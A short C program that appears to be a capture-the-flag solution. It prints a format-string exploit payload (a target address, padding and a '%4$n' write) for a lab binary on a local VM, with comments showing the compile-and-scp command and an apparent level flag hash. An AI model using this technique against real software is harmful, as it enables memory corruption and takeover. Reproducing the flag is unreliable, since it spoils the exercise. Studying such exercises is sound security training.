#include <unistd.h>

//gcc script.c && ./a.out > payload && scp -P 4242 payload level3@192.168.56.105:/tmp/payload3
//492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

int main() {
    int m_address = 0x804988c;
    write(1, &m_address, 4);
    for (int i = 0; i < 60; ++i)
        write(1, "B", 1);
    write(1, "%4$n\n", 5);
}